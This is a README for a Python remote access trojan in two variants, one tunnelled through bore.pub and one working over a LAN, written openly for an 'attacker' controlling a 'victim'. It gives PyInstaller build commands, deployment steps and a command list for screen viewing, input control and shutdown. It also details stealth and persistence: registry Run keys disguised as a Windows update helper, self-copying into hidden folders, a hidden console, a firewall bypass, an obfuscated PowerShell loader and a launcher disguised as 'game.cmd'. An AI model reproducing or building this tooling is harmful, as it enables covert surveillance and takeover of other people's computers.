# Remote Control Tool (global version)

A Python-based remote control RAT that tunnels through [bore.pub](https://github.com/ekzhang/bore) — no VPS, no relay, no manual IP/port passing.

## How It Works

```
Attacker                          bore.pub                    Victim
┌──────────────┐    bore tunnel   ┌──────────┐    auto-scan   ┌──────────────┐
│  client.exe  │◄────────────────►│ :65535   │◄──────────────►│  server.exe  │
│  Flask web   │    ─────────     │  ...     │   scan + AUTH  │  screenshots │
│  UI :5000    │    bore.exe      │ :65000   │                │  cmd exec    │
└──────────────┘                  └──────────┘                └──────────────┘
       │                              │
  Bundles bore.exe              Port 65523
  Claims free port              (found by scan)
```

1. **Client** — bundles `bore.exe`, claims a free port on bore.pub (65535→65000)
2. **Victim** — scans bore.pub ports 65535→65000, connects to open port, sends AUTH handshake
3. **Tunnel established** — attacker sees victim screen in browser, sends commands

## Files

| File | Description |
|------|-------------|
| `webclient.py` | Client source — attacker machine |
| `client.exe` | Compiled client (14 MB, includes bore.exe) |
| `serveranydusk.py` | Server source — victim machine |
| `server.exe` | Compiled server (94 MB, no console) |
| `bore.exe` | bore tunnel binary (v0.6.0) |

## Requirements

### Victim (Server)

```
pip install pyautogui pynput psutil
```

### Attacker (Client)

No Python needed — compiled EXE bundles everything including bore.exe.

## Building

```bash
# Client (bundles bore.exe)
pyinstaller --onefile --name client --add-binary "bore.exe;." webclient.py

# Server (no console)
pyinstaller --onefile --noconsole --name server serveranydusk.py
```

## Usage

### Method 1: Compiled EXE (recommended)

1. Run `client.exe` on attacker machine
2. Run `server.exe` on victim machine
3. Server automatically scans bore.pub, finds client, connects (~5–15 sec)
4. Browser opens with live screen view at `http://localhost:5000`

### Method 2: Direct Python

```bash
# Attacker
python webclient.py --auto

# Victim
python serveranydusk.py
```

## Features

| Feature | Description |
|---------|-------------|
| Remote desktop | Live stream in browser (JPEG, 25% quality) |
| Mouse control | Move, click, drag via web UI or commands |
| Keyboard input | Type text, press special keys |
| Open URL | `open https://...` on victim |
| Lock/Unlock | Lock or unlock victim screen |
| Reverse mouse | Invert X-axis for trolling |
| Auto move | Random mouse movement |
| Auto click | Click spam with interval/duration |
| Task Manager block | `block_taskmgr` |
| Fake error/virus | Popup pranks |
| Error spam | Endless error popups (toggle) |
| Rick roll | Opens Rick Astley in browser |
| Shutdown | Shuts down victim |

## Web UI Commands

Type commands in the text box on the web page:

- `move 100 50` — move mouse by offset
- `click_at 500 300` — click at position
- `click left` / `click right`
- `type Hello, world!`
- `key enter` / `key tab`
- `special_key ctrl` / `special_key alt`
- `open https://youtu.be/dQw4w9WgXcQ`
- `lock_screen` / `unlock`
- `autoclick 0.1 5` — click every 0.1s for 5s
- `exit` — disconnect

## Stealth

- **Autostart** — adds to `HKCU\...\Run\WindowsUpdateHelper`
- **Console hidden** — compiled `--noconsole`
- **Self-copy** — copies to `%LOCALAPPDATA%\Microsoft\Windows\Caches\WindowsUpdateHelper.exe`

## Technical Details

- **Tunnel**: bore.pub (free, no account needed)
- **Port range**: 65535→65000 (high ports, rarely occupied)
- **Auth**: SECRET handshake (`AUTH <secret>\n` / `AUTH_OK`)
- **Screen**: PIL `pyautogui.screenshot()` → JPEG → 4-byte length prefix
- **Scan**: `ThreadPoolExecutor(20)` — 536 ports in ~8 seconds worst case
- **No VPS, no relay, no manual config**

---

# LAN Remote Control

Remote desktop & control over LAN. Full access: screen stream, mouse/keyboard control, lock screen, startup persistence, firewall bypass. Single-file launcher, zero dependencies on target (Python auto-installs).

## Features

- **Single file** — click `game.cmd`, it runs everything
- **Stealth** — no .py files, no console, no "Python" in startup
- **Port 80** — bypasses Windows Firewall without admin rights
- **Self-install** — copies to `%LOCALAPPDATA%\Microsoft\Windows\Caches\`, hidden+system attributes
- **Persistence** — `Run` + `StartupApproved\Run` (Enabled)
- **LAN discovery** — UDP broadcast on port 45631
- **Obfuscation** — PowerShell loader, base64 + exec, named `WUHelper.*`

## Usage

1. Run `game.cmd` — double-click
2. Server prints LAN IP and port (e.g. `192.168.1.10:80`)
3. Connect with client (`webclient.py`) to that address

## Commands

| Command | Description |
|---------|-------------|
| `move X Y` | Move cursor by X,Y |
| `click left/right` | Mouse click |
| `click_at X Y` | Click at coordinates |
| `type text` | Type text |
| `key KEY` | Press a key |
| `special_key NAME` | Ctrl, Shift, Alt, Enter, Esc... |
| `open URL` | Open URL in browser |
| `automove` | Wiggle mouse |
| `autoclick [interval] [duration]` | Auto-click loop |
| `shutdown` | Shutdown PC |
| `rick` | Rick Roll |
| `fake_virus` | Fake virus alert |
| `fake_error` | Fake system error |
| `error_spam` | Toggle error popup spam |
| `block_taskmgr` | Toggle Task Manager block |
| `lock_screen` | Lock screen with password |
| `unlock` | Unlock screen |
| `reverse_mouse` | Toggle inverted mouse |
| `exit` | Stop server |

## Files

- `game.cmd` — single-file launcher (double-click and done)
- `cleanup.cmd` — full trace removal
- `webclient(local).py` — client to connect
- `serveranydusk(local).py` — server source

## Cleanup

Run `cleanup.cmd`. Kills process, removes files from `Caches\`, cleans registry and firewall rules.

## Build

```bash
python gen_ps_loader.py serveranydusk(local).py game
```

